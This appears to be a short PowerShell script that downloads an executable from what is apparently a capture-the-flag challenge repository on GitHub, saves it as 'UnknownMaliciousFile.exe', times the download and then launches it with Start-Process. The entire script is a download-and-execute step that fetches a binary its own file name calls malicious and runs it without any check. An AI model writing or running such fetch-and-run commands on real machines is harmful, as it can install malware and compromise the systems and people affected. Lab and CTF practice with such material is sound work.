$url = "https://github.com/NotSurprised/MyCTF-Challenges/raw/master/ForUCCU/Bof/a17c074327645f88d92de82b511882a2935087990ef46063cef7f208c05a861f.exe"
$output = "UnknownMaliciousFile.exe"
$start_time = Get-Date

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "UnknownMaliciousFile.exe"